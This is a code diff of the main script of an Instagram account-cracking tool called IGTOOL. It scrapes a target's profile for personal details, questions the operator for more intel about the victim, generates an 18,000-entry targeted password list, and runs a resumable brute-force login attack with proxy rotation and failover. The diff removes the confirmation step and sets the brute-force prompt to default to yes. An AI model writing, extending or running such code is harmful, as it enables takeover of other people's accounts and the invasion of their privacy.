@@ -1,21 +1,29 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 """
-IGTOOL v3 — Full suite
-OSINT → Interview (your intel) → Targeted dictionary 18000 → Brute (progress)
+IGTOOL v3.2 — Clean startup
+Proxy auto-fetch + failover built-in.
+Asks ONLY: username + proxy
 """
 
 import os
 import sys
 
 from core.banner import (
-    C, show_banner, clear, info, ok, warn, err, step, ask, yesno, menu,
+    C, show_banner, clear, info, ok,
+    warn, err, step, ask, yesno, menu,
 )
 from core.osint import OSINT
 from core.interviewer import Interviewer
 from core.wordlist import WordlistAI
 from core.brute import BruteEngine
 from core.api import InstagramAPI
+
+
+OUTPUT_DIR = "output"
+DEFAULT_WL_SIZE = 18000
+DEFAULT_DELAY_MIN = 3.0
+DEFAULT_DELAY_MAX = 5.0
 
 
 def count_lines(path):
@@ -26,24 +34,35 @@ def count_lines(path):
         return 0
 
 
+def lists_or(*vals):
+    for v in vals:
+        if v is None:
+            continue
+        if isinstance(v, list):
+            return v
+        if v:
+            return v
+    return []
+
+
 def merge_hints(answers, hints, username):
     answers = dict(answers or {})
     hints = hints or {}
     answers["username"] = answers.get("username") or username
-    answers["full_name"] = answers.get("full_name") or hints.get(
-        "full_name", ""
-    )
+    answers["full_name"] = answers.get("full_name") or hints.get("full_name", "")
     answers["biography"] = hints.get(
         "biography", answers.get("biography", "")
     )
-    answers["bio_tokens"] = hints.get("bio_tokens", [])
-    answers["osint_tokens"] = hints.get("bio_tokens", [])
-    answers["osint_years"] = hints.get("years", [])
-    answers["years"] = hints.get("years", [])
-    answers["phones"] = hints.get("phones") or answers.get("phones") or []
-    answers["osint_phones"] = hints.get("phones", [])
-    answers["user_parts"] = hints.get("user_parts", [])
-    answers["stat_numbers"] = hints.get("stat_numbers", [])
+    answers["bio_tokens"] = lists_or(hints.get("bio_tokens"), [])
+    answers["osint_tokens"] = lists_or(hints.get("bio_tokens"), [])
+    answers["osint_years"] = lists_or(hints.get("years"), [])
+    answers["years"] = lists_or(hints.get("years"), [])
+    answers["phones"] = lists_or(
+        hints.get("phones"), answers.get("phones"), []
+    )
+    answers["osint_phones"] = lists_or(hints.get("phones"), [])
+    answers["user_parts"] = lists_or(hints.get("user_parts"), [])
+    answers["stat_numbers"] = lists_or(hints.get("stat_numbers"), [])
     answers["followers"] = hints.get("followers", 0)
     answers["following"] = hints.get("following", 0)
     answers["posts"] = hints.get("posts", 0)
@@ -52,24 +71,24 @@ def merge_hints(answers, hints, username):
     return answers
 
 
-def run_osint(username, output_dir, proxy):
+def run_osint(username, proxy):
     sid = os.environ.get("IG_SESSIONID") or None
-    bot = OSINT(username, output_dir, proxy, sessionid=sid)
+    bot = OSINT(username, OUTPUT_DIR, proxy, sessionid=sid)
     data = bot.scrape()
     hints = bot.get_hints() if bot.data else {"username": username}
     hints["username"] = hints.get("username") or username
     return bot, data, hints
 
 
-def gen_dict(answers, output_dir, username, count=18000):
-    path = os.path.join(output_dir, username, "wordlist.txt")
+def gen_dict(answers, username, count=DEFAULT_WL_SIZE):
+    path = os.path.join(OUTPUT_DIR, username, "wordlist.txt")
     ai = WordlistAI(answers, target_count=count)
-    info(f"Building dictionary from your intel → {count} target...")
+    info(f"Building targeted dictionary → {count} passwords...")
     ai.generate()
     ai.save(path)
     ok(ai.report())
     ok(f"Saved → {path}")
-    sample = sorted(ai.passwords)[:12]
+    sample = sorted(ai.passwords)[:10]
     if sample:
         print(f"\n{C.W}Sample:{C.E}")
         for s in sample:
@@ -77,224 +96,200 @@ def gen_dict(answers, output_dir, username, count=18000):
     return path, ai.count
 
 
-def confirm(username, n):
-    print(f"\n{C.R}  Test {n} passwords against @{username}{C.E}")
-    return yesno("Continue?", default_yes=False)
+def wl_path(username):
+    return os.path.join(OUTPUT_DIR, username, "wordlist.txt")
 
 
 def main():
     clear()
     show_banner()
-    print(f"{C.W}── Target ──{C.E}\n")
+
+    print(f"{C.W}── Setup ──{C.E}\n")
 
     username = ask("Instagram username").strip().lstrip("@")
     if not username:
         err("Username required")
         sys.exit(1)
 
-    output_dir = ask("Output directory", "output")
-    os.makedirs(os.path.join(output_dir, username), exist_ok=True)
-
-    warn("Proxy: leave EMPTY unless residential/working proxy")
-    proxy = ask("Proxy URL (ENTER=none)", "") or None
-    proxy_file = ask("Proxy list file (ENTER=none)", "") or None
-
-    sid = ask("sessionid cookie (ENTER=skip)", "")
-    if sid:
-        os.environ["IG_SESSIONID"] = sid.strip()
-        ok("sessionid set")
-    elif os.environ.get("IG_SESSIONID"):
-        info("Using IG_SESSIONID from env")
-
-    info(f"Checking @{username}...")
-    exists = InstagramAPI(proxy=proxy).profile_exists(username)
-    if exists is False:
-        err("Account not found / unreachable")
-    elif exists:
-        ok("Account reachable")
+    proxy = ask("Proxy (ENTER = without proxy)").strip()
+    if not proxy:
+        proxy = None
     else:
-        warn("Could not verify — continue")
+        if "://" not in proxy:
+            proxy = "http://" + proxy
+        ok(f"Proxy: {proxy}")
+
+    os.makedirs(os.path.join(OUTPUT_DIR, username), exist_ok=True)
+    proxy_file = None
+    if os.path.isfile("proxies.txt"):
+        proxy_file = "proxies.txt"
+        info("Found proxies.txt (optional rotation)")
+
+    info(f"Target : @{username}")
+    info(f"Output : {OUTPUT_DIR}/{username}/")
+    info(f"Proxy  : {proxy or 'DIRECT (auto-fetch ON)'}")
+    print()
+
+    info("Checking target...")
+    try:
+        exists = InstagramAPI(proxy=proxy).profile_exists(username)
+        if exists is True:
+            ok(f"@{username} reachable")
+        elif exists is False:
+            warn(f"@{username} may not exist — you can still continue")
+        else:
+            warn("Could not verify — continue anyway")
+    except Exception:
+        warn("Check skipped — continue")
 
     while True:
         choice = menu(
             [
                 "OSINT — name, bio, followers, posts",
-                "DICTIONARY — Interview (your intel) → 18000 passwords",
-                "BRUTE FORCE — live progress + current password",
-                "FULL — OSINT → Interview → Dictionary → Brute",
-                "RESUME previous brute",
-                "PROXY CHECK",
+                "DICTIONARY — your intel → 18000 passwords",
+                "BRUTE FORCE — live progress + auto proxy failover",
+                "FULL ATTACK — OSINT → Interview → Dict → Brute",
+                "RESUME — continue previous brute",
                 "EXIT",
             ],
-            f"@ {username}",
+            f"@ {username}  |  proxy: {proxy or 'auto-fetch'}",
         )
 
-        wl = os.path.join(output_dir, username, "wordlist.txt")
-
-        # 1 OSINT
         if choice == 1:
             step(1, 1, "OSINT")
-            _, data, _ = run_osint(username, output_dir, proxy)
+            _, data, _ = run_osint(username, proxy)
             if data:
-                ok(f"Saved output/{username}/osint.json")
-            ask("ENTER to return")
-            clear()
-            show_banner()
-            continue
-
-        # 2 DICTIONARY from YOUR intel
-        if choice == 2:
-            step(1, 3, "OSINT optional")
-            if yesno("Try OSINT first?", default_yes=False):
-                _, _, hints = run_osint(username, output_dir, proxy)
+                ok(f"Saved → {OUTPUT_DIR}/{username}/osint.json")
             else:
-                hints = {"username": username}
-                info("Skipped OSINT — dictionary will use interview only")
-
-            step(2, 3, "INTERVIEW — عبي المعلومات")
-            answers = Interviewer(username, hints, output_dir).run()
-            answers = merge_hints(answers, hints, username)
-
-            step(3, 3, "GENERATE DICTIONARY")
-            try:
-                n = int(ask("Dictionary size", "18000"))
-            except ValueError:
-                n = 18000
-            gen_dict(answers, output_dir, username, n)
-            ask("\nENTER to return")
+                warn("OSINT limited — use DICTIONARY + interview")
+            ask("ENTER")
             clear()
             show_banner()
             continue
 
-        # 3 BRUTE
-        if choice == 3:
-            if not os.path.isfile(wl):
-                warn("No dictionary found")
-                if yesno("Build dictionary now from interview?", True):
-                    hints = {"username": username}
-                    if yesno("Try OSINT first?", False):
-                        _, _, hints = run_osint(
-                            username, output_dir, proxy
-                        )
-                    answers = Interviewer(
-                        username, hints, output_dir
-                    ).run()
-                    answers = merge_hints(answers, hints, username)
-                    wl, _ = gen_dict(answers, output_dir, username, 18000)
-                else:
-                    continue
-
-            n = count_lines(wl)
-            if n == 0:
-                err("Empty dictionary")
-                continue
-            if not confirm(username, n):
-                continue
+        if choice == 2:
+            step(1, 2, "OSINT (auto, quiet if fails)")
             try:
-                dmin = float(ask("Min delay sec", "3"))
-                dmax = float(ask("Max delay sec", "5"))
-            except ValueError:
-                dmin, dmax = 3.0, 5.0
+                _, _, hints = run_osint(username, proxy)
+            except Exception:
+                hints = {"username": username}
+                warn("OSINT skipped")
+            if not hints:
+                hints = {"username": username}
+
+            step(2, 2, "INTERVIEW → dictionary")
+            answers = Interviewer(username, hints, OUTPUT_DIR).run()
+            answers = merge_hints(answers, hints, username)
+            gen_dict(answers, username, DEFAULT_WL_SIZE)
+            ask("\nENTER")
+            clear()
+            show_banner()
+            continue
+
+        if choice == 3:
+            path = wl_path(username)
+            if not os.path.isfile(path) or count_lines(path) == 0:
+                warn("No dictionary yet — building now")
+                try:
+                    _, _, hints = run_osint(username, proxy)
+                except Exception:
+                    hints = {"username": username}
+                answers = Interviewer(username, hints, OUTPUT_DIR).run()
+                answers = merge_hints(answers, hints, username)
+                path, _ = gen_dict(answers, username, DEFAULT_WL_SIZE)
+
+            n = count_lines(path)
+            print(f"\n{C.R}  {n} passwords → @{username}{C.E}")
+            if not yesno("Start brute?", default_yes=True):
+                continue
+
             found = BruteEngine(
-                username, wl, output_dir, dmin, dmax, proxy, proxy_file
+                username,
+                path,
+                OUTPUT_DIR,
+                delay_min=DEFAULT_DELAY_MIN,
+                delay_max=DEFAULT_DELAY_MAX,
+                proxy=proxy,
+                proxy_file=proxy_file,
             ).run()
             if found:
-                print(f"\n{C.G}{'═' * 40}{C.E}")
-                print(f"{C.G}  PASSWORD: {found}{C.E}")
-                print(f"{C.G}{'═' * 40}{C.E}")
-            ask("ENTER to return")
+                print(f"\n{C.G}{'═' * 42}{C.E}")
+                print(f"{C.G}  PASSWORD FOUND: {found}{C.E}")
+                print(f"{C.G}  Saved: {OUTPUT_DIR}/{username}/found.txt{C.E}")
+                print(f"{C.G}{'═' * 42}{C.E}")
+            ask("\nENTER")
             clear()
             show_banner()
             continue
 
-        # 4 FULL
         if choice == 4:
-            step(1, 4, "OSINT")
-            _, _, hints = run_osint(username, output_dir, proxy)
-
-            step(2, 4, "INTERVIEW")
-            answers = Interviewer(username, hints, output_dir).run()
-            answers = merge_hints(answers, hints, username)
-
-            step(3, 4, "DICTIONARY")
+            step(1, 3, "OSINT")
             try:
-                n = int(ask("Size", "18000"))
-            except ValueError:
-                n = 18000
-            wl, cnt = gen_dict(answers, output_dir, username, n)
+                _, _, hints = run_osint(username, proxy)
+            except Exception:
+                hints = {"username": username}
 
-            if not confirm(username, cnt):
-                warn("Dictionary saved — attack skipped")
+            step(2, 3, "INTERVIEW + DICTIONARY")
+            answers = Interviewer(username, hints, OUTPUT_DIR).run()
+            answers = merge_hints(answers, hints, username)
+            path, cnt = gen_dict(answers, username, DEFAULT_WL_SIZE)
+
+            step(3, 3, "BRUTE FORCE")
+            print(f"\n{C.R}  {cnt} passwords → @{username}{C.E}")
+            if not yesno("Start brute?", default_yes=True):
+                warn("Dictionary saved — brute skipped")
                 ask("ENTER")
                 clear()
                 show_banner()
                 continue
 
-            step(4, 4, "BRUTE")
-            try:
-                dmin = float(ask("Min delay", "3"))
-                dmax = float(ask("Max delay", "5"))
-            except ValueError:
-                dmin, dmax = 3.0, 5.0
             found = BruteEngine(
-                username, wl, output_dir, dmin, dmax, proxy, proxy_file
+                username,
+                path,
+                OUTPUT_DIR,
+                delay_min=DEFAULT_DELAY_MIN,
+                delay_max=DEFAULT_DELAY_MAX,
+                proxy=proxy,
+                proxy_file=proxy_file,
             ).run()
             if found:
-                print(f"\n{C.G}  PASSWORD: {found}{C.E}")
-            ask("ENTER")
+                print(f"\n{C.G}  PASSWORD FOUND: {found}{C.E}")
+            ask("\nENTER")
             clear()
             show_banner()
             continue
 
-        # 5 RESUME
         if choice == 5:
-            prog = os.path.join(output_dir, username, "progress.json")
+            prog = os.path.join(OUTPUT_DIR, username, "progress.json")
+            path = wl_path(username)
             if not os.path.isfile(prog):
-                err("No progress to resume")
+                err("Nothing to resume")
                 ask("ENTER")
                 continue
-            if not os.path.isfile(wl):
+            if not os.path.isfile(path):
                 err("wordlist.txt missing")
                 ask("ENTER")
                 continue
+            info("Resuming...")
             found = BruteEngine(
                 username,
-                wl,
-                output_dir,
+                path,
+                OUTPUT_DIR,
+                delay_min=DEFAULT_DELAY_MIN,
+                delay_max=DEFAULT_DELAY_MAX,
                 proxy=proxy,
                 proxy_file=proxy_file,
                 resume=True,
             ).run()
             if found:
-                print(f"\n{C.G}  PASSWORD: {found}{C.E}")
-            ask("ENTER")
+                print(f"\n{C.G}  PASSWORD FOUND: {found}{C.E}")
+            ask("\nENTER")
             clear()
             show_banner()
             continue
 
-        # 6 PROXY
         if choice == 6:
-            from core.proxy import ProxyManager
-
-            pm = ProxyManager(proxy_file=proxy_file, proxy_url=proxy)
-            if pm.count == 0:
-                warn("No proxies — DIRECT is recommended")
-            else:
-                pm.validate_all()
-                for p in pm._alive:
-                    print(
-                        f"  {C.G}ALIVE{C.E} {p['url']} ({p['latency']:.2f}s)"
-                    )
-                for p in pm._dead:
-                    print(f"  {C.R}DEAD{C.E}  {p}")
-            ask("ENTER")
-            clear()
-            show_banner()
-            continue
-
-        # 7 EXIT
-        if choice == 7:
-            print(f"\n{C.C}Bye.{C.E}\n")
+            print(f"\n{C.C}  Bye.{C.E}\n")
             sys.exit(0)
 
 
@@ -302,5 +297,5 @@ if __name__ == "__main__":
     try:
         main()
     except KeyboardInterrupt:
-        print(f"\n{C.Y}[!] stop{C.E}")
+        print(f"\n{C.Y}[!] stopped{C.E}")
         sys.exit(0)
